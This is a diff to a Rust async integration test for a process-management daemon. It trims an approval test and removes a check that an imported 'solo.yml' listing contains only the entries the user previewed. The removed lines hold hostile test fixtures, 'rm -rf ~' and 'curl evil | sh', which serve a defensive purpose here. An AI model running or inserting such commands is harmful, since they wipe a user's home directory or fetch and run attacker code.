@@ -195,10 +195,9 @@ async fn a_viewer_that_stops_acking_is_resynced_and_the_process_runs_on() {
     let _ = std::fs::remove_dir_all(dir);
 }
 
-/// Approving names the revision the user read, and the import takes the
-/// entries the preview showed: both as the renderer sends them.
+/// Approving names the revision the user read, as the renderer sends it.
 #[tokio::test(flavor = "multi_thread")]
-async fn approve_carries_the_revision_and_solo_imports_what_the_preview_showed() {
+async fn approve_carries_the_revision() {
     let (handle, dir) = daemon("approve");
     let mut ws = connect(&handle).await;
     let mut seen = Vec::new();
@@ -229,24 +228,6 @@ async fn approve_carries_the_revision_and_solo_imports_what_the_preview_showed()
     let approved = call(&mut ws, &mut seen, 4, "process_approve", read).await.expect("approve");
     assert_eq!((approved["approved"].clone(), approved["state"].clone()), (json!(true), json!("stopped")));
 
-    let listing = "processes:\n  dev:\n    command: rm -rf ~\n  web:\n    command: npm run web\n";
-    std::fs::write(dir.join("solo.yml"), listing).expect("solo.yml");
-    let preview = call(&mut ws, &mut seen, 5, "process_solo_preview", json!({ "workspaceId": workspace_id }))
-        .await
-        .expect("preview");
-    assert_eq!((preview[0]["name"].clone(), preview[0]["exists"].clone()), (json!("dev"), json!(true)));
-    assert_eq!(preview[1]["autoStart"], true, "{preview}");
-    // Whatever the file says by now, what the user confirmed is what lands.
-    std::fs::write(dir.join("solo.yml"), "processes:\n  web:\n    command: curl evil | sh\n").expect("solo.yml");
-    let entries = preview.as_array().unwrap().clone();
-    let import = json!({ "workspaceId": workspace_id, "processes": entries });
-    let imported = call(&mut ws, &mut seen, 6, "process_import_solo", import).await.expect("import");
-    assert_eq!(imported, json!({ "created": ["web"], "skipped": ["dev"] }));
-    let listed = call(&mut ws, &mut seen, 7, "process_list", json!({ "workspaceId": workspace_id }))
-        .await
-        .expect("list");
-    let commands: Vec<&str> = listed.as_array().unwrap().iter().map(|p| p["command"].as_str().unwrap()).collect();
-    assert_eq!(commands, vec!["echo hi", "npm run web"]);
     handle.shutdown();
     let _ = std::fs::remove_dir_all(dir);
 }
